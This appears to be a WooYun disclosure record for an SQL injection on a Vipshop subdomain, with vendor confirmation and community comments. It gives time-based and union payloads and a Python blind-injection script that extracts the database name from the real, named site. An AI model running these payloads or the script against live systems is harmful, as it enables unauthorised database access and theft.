{"id": 87204, "wybug_id": "wooyun-2016-0195738", "wybug_title": "唯品会某分站SQL注入漏洞 (附利用技巧)", "wybug_corp": "唯品会", "wybug_author": "猪猪侠", "wybug_date": "2016-04-13 09:59", "wybug_open_date": "2016-05-28 17:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向公众公开  简要描述： 唯品会某分站SQL注入漏洞那么高端的WAF，为什么不启用呢？ 详细说明：  #1 注入点http://share.vip.com/Acts/SetCount?id=63200#2 PAYLOAD, 5秒后打开网页http://share.vip.com/Acts/SetCount?id=63200' AND (SELECT * FROM (SELECT(SLEEP(5)))RING) and 'RING'='RING#3 基于时间差注入\n(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE()),\" + str(i) + \",1))=\" + str(ord(_str)) + \")*5)))RING)\n#* 另一种注入方式\nhttp://share.vip.com/Acts/SetCount?id=63200' and if((1=2),1,(select 1 union select 2))#\n   漏洞证明：  #4 EXP\n#!/usr/bin/env python# encoding: utf-8# vip_new.py # ringzero@0x557.orgimport requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,20):    for _str in payloads:        start_time = time.time()        url = \"http://share.vip.com/Acts/SetCount?id=63200' AND (SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE()),\" + str(i) + \",1))=\" + str(ord(_str)) + \")*5)))RING) AND 'RING'='RING\"        result = requests.get(url).text        if(time.time() - start_time) > 3:            print _str            break\n#5 注入证明\ndatabase()vipshop_shareuser()vipshop_share@10.201.51.***\n   修复方案：  那么高端的WAF，为什么不启用呢？   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-13 17:11 厂商回复： 您好，经确认，该问题真实存在且影响高危，已联系相关人员处理，感谢对我们业务的支持与贡献！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-13 10:04 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:94        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  那么高端的WAF，为什么不启用呢？    \n     2016-04-13 10:05 |    \t\tADVERT \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:26        | Stay hungry,stay foolish.)\t\t \n  学习一下。    \n     2016-04-13 10:11 |    \t\t小苹果 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:60        | 只要锄头挥的好，哪有洞挖不到)\t\t \n  怎么知道他有那么高端的waf    \n     2016-04-13 10:11 |    \t\tbacktrack丶yao \t\t\t( 普通白帽子  |\t\t\t        Rank:298 漏洞数:110        )\t\t \n  那么高端的WAF，为什么不启用呢？    \n     2016-04-13 10:13 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:81        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  又是waf惹的祸，背锅了    \n     2016-04-13 10:14 |    \t\tlinkey \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:38        | sqlmap的超爱好者)\t\t \n  这。waf很高端？     \n     2016-04-13 10:30 |    \t\tjust_joker \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:22        | ..........)\t\t \n  那么启用的WAF，为什么不高端呢？    \n     2016-04-13 10:42 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:804 漏洞数:104        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  目测脱裤会触发。try it    \n     2016-04-13 10:48 |    \t\tbit4 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | 终于，我也是有ID的人了！)\t\t \n  @齐迹 能跑出注入点和数据库列表，但是如果尝试拖库就会封IP，是不是就是waf惹的祸？大神有识别waf的神器么？    \n     2016-04-13 12:08 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5112 漏洞数:394        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  附带了一个利用技巧    \n     2016-04-13 12:22 |    \t\tbit4 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | 终于，我也是有ID的人了！)\t\t \n  @猪猪侠 猪哥威武，期待公开~~    \n     2016-04-13 17:31 |    \t\tANS5 \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:106        | 此心安处是吾乡)\t\t \n  期待公开利用技巧。。。    \n     2016-04-13 17:37 |    \t\ttSt \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:30        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  那么高端的WAF，为什么不启用呢？    \n     2016-04-13 18:21 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:804 漏洞数:104        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  @bit4 waf可以做到，但是你遇到的场景是不是那就不能肯定了    \n     2016-04-13 19:02 |    \t\tRand0m \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | 竟然还有人冒充我，醉了，骗子QQ：44569754...)\t\t \n  前排坐等公开    \n     2016-04-14 08:29 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 多学习，多挖洞！)\t\t \n  大哥，收小弟不？    \n     2016-04-14 14:11 |    \t\tdragon110 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 谨言、慎行、多思。)\t\t \n  期待    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}